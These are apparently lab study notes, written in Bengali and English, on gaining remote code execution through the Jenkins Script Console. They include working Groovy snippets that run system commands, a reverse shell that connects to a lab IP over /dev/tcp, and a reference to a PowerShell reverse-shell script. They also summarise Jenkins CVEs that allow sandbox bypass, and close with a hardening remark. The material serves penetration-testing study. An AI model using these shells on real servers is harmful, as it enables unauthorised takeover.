## 1. Script Console

- Jenkins-এ weak credentials দিয়ে access পেলে Script Console ব্যবহার করে server-এ command execution করা যায়।
- Script Console-এ arbitrary Groovy script চালানো যায়।
- Jenkins সাধারণত `root` বা `SYSTEM` account-এ চলে, তাই RCE হলে high privilege পাওয়া সম্ভব।

### Script Console URL

`http://jenkins.inlanefreight.local:8000/script`

- Groovy হলো object-oriented, Java-compatible language।
- Python ও Ruby-এর মতো।
- Groovy code → Java Bytecode-এ compile হয়।
- JRE থাকা যেকোনো platform-এ run করতে পারে।

### Linux Command Execution

`id` command চালানোর Groovy script:

```
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```

Result:

`uid=0(root) gid=0(root)`

### Linux Reverse Shell

Groovy দিয়ে reverse shell:

```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

Listener:

```

```


### Windows Command Execution

Windows Jenkins-এ command চালাতে:

```
def cmd = "cmd.exe /c dir".execute();
println("${cmd.text}");
```

Windows host-এ access পাওয়ার উপায়:

- নতুন user তৈরি করে RDP বা WinRM দিয়ে connect করা।
- System-এ পরিবর্তন না করতে চাইলে PowerShell download cradle ব্যবহার করা।
- [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1?utm_source=chatgpt.com) ব্যবহার করা যায়।

## 2. Miscellaneous Vulnerabilities

### CVE-2018-1999002 + CVE-2019-1003000

- Jenkins-এর বিভিন্ন version-এ RCE vulnerability রয়েছে।
- এই দুটি vulnerability একসঙ্গে ব্যবহার করে pre-authenticated RCE সম্ভব।
- Script compilation-এর সময় script security sandbox bypass করা যায়।
- Jenkins-এর dynamic routing flaw exploit করে:
  - Overall / Read ACL bypass করা যায়।
  - Groovy ব্যবহার করে malicious JAR download ও execute করা যায়।
- Read permission থাকা user-ও sandbox bypass করে Jenkins master server-এ code execute করতে পারে।
- Affected version: Jenkins 2.137।

[CVE-2019-1003000 Advisory](https://jenkins.io/security/advisory/2019-01-08/?utm_source=chatgpt.com#SECURITY-1266)

### Jenkins 2.150.2 Vulnerability

- Jenkins 2.150.2-তে Node.js ব্যবহার করে system-এ code execution সম্ভব।
- প্রয়োজনীয় privileges:
  - JOB creation
  - BUILD
- Authentication প্রয়োজন।
- তবে anonymous user enabled থাকলে exploit সফল হতে পারে, কারণ anonymous users-এর default-এ JOB creation ও BUILD privileges থাকে।

### Jenkins Security

- Administrator access পেলেই দ্রুত RCE পাওয়া সম্ভব।
- Jenkins-এর অনেক working RCE exploit আছে, তবে সেগুলো version-specific।
- লেখার সময় current LTS version ছিল 2.303.1।
- এই version উপরের দুটি vulnerability fix করে।
- Jenkins harden করা জরুরি, কারণ built-in functionality দিয়েই underlying server takeover করা সম্ভব।
